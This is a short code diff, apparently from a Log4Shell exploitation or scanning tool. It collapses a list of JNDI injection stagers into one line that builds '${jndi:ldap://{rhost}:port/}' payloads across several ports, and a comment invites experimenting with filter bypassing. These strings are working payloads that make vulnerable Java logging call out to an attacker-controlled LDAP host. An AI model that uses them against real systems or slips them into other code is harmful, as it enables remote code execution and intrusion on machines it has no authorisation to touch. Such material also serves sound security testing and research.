@@ -32,13 +32,7 @@ TARGETS = [
 
 
 # NOTE: This is where you want to experiment with filter bypassing:
-
-STAGERS = [
-    '${{jndi:ldap://{rhost}/}}',  # NOTE: Double brackets escape for string formatting
-    
-]
-for port in JNDI_PORTS:
-    STAGERS.append('${{jndi:ldap://{rhost}:' + str(port) + '/}}')
+STAGERS = ['${{jndi:ldap://{rhost}:' + str(port) + '/}}' for port in JNDI_PORTS]
 
 
 JNDI_RESPONSE = """dn:
